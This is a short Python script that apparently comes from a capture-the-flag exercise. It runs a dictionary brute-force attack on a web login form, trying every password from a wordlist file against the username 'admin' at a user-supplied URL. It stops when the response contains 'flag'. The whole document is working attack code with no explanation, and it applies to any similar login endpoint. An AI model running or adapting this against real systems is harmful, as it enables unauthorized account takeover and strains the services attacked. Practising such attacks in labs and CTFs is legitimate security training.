import requests

BASE_URL = input('BASE URL:')
DIC = input('DIC PATH:')

with open(DIC) as fp:
    dictionnary = fp.read()

for password in dictionnary.split('\n'):
    r = requests.get(BASE_URL, {
        'page': 'signin',
        'username': 'admin',
        'password': password.strip(),
        'Login': 'Login'
    })

    print('nop')

    if 'flag' in r.text:
        print(password)
        break
